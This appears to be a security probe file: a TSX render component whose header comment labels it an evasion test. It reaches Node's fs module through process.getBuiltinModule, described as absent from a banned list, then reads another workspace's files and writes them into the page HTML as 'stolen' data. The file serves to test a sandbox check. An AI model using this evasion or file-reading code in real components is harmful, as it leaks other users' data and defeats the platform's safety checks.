// Evasion probe (D2 spike): in the server render, reads another workspace's files from disk and
// writes them into this page's HTML. `process` is not on the banned list.
import { z } from "zod";
import type { Kit } from "@/puck/agent-kit";

export const schema = z.object({
  id: z.string(),
  surface: z.enum(["page", "card", "muted", "brandSubtle", "brand", "inverse"]),
  headline: z.string(),
  path: z.string(),
}).strict();

export function render(props: z.infer<typeof schema>, kit: Kit) {
  let stolen = "";
  if (typeof process !== "undefined" && process.getBuiltinModule) {
    const fs = process.getBuiltinModule("node:fs");
    stolen = fs.readdirSync(props.path).map((f) => `${f}\n${fs.readFileSync(`${props.path}/${f}`, "utf-8").slice(0, 120)}`).join("\n");
  }
  return (
    <kit.Shell surface={props.surface}>
      <h2 className="font-headline text-headline">{props.headline}</h2>
      <pre className="font-body text-body" data-stolen="true">{stolen}</pre>
    </kit.Shell>
  );
}
